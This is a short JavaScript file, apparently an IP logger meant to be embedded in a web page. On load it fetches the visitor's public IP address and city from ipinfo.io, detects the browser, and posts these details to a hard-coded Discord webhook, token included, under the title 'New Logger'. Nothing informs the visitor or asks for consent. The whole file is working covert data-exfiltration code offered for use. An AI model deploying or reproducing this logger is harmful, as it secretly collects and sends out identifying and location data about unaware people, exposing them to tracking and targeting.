function sendToDiscord(ip, city, browser) {
    const webhookUrl = 'https://discord.com/api/webhooks/1272920222776426516/s8qm5PBe-j1Xe9iTzCNzt_DHIW6L3Fur5IHKuA0c3dOKr9urmfQNQosJPSiib0FUGrBS';  // Your Discord webhook URL

    const payload = {
        embeds: [{
            title: "__🤖 New Logger__",
            description: "**Logging user information...**",
            color: 7506394,
            fields: [
                { name: "__🍦 IP Address__", value: `**${ip}**`, inline: true },
                { name: "__🚬 City__", value: `**${city}**`, inline: true },
                { name: "__🚀 Browser__", value: `**${browser}**`, inline: true },
            ],
            timestamp: new Date().toISOString(),  // Current timestamp
        }]
    };
    

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok.');
        }
        console.log('IP, City, and Browser info sent to Discord successfully.');
    })
    .catch(error => {
        console.error('Error sending information to Discord:', error);
    });
}

function checkIp() {
    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const userIp = data.ip;
            const city = data.city;
            const browser = detectBrowser();

            console.log(`User IP is: ${userIp}`);
            console.log(`City is: ${city}`);
            console.log(`Browser is: ${browser}`);
            
            // Send IP, city, and browser info to Discord webhook
            sendToDiscord(userIp, city, browser);
        })
        .catch(error => {
            console.error('Error obtaining IP or other data:', error);
        });
}

function detectBrowser() {
    const userAgent = navigator.userAgent;
    let browserName = 'Unknown Browser';

    if (userAgent.includes('Chrome')) {
        browserName = 'Google Chrome';
    } else if (userAgent.includes('Firefox')) {
        browserName = 'Mozilla Firefox';
    } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
        browserName = 'Apple Safari';
    } else if (userAgent.includes('Edg')) {
        browserName = 'Microsoft Edge';
    } else if (userAgent.includes('OPR') || userAgent.includes('Opera')) {
        browserName = 'Opera';
    } else if (userAgent.includes('Trident')) {
        browserName = 'Internet Explorer';
    }

    return browserName;
}

// Call the function to check the IP and send it to Discord
checkIp();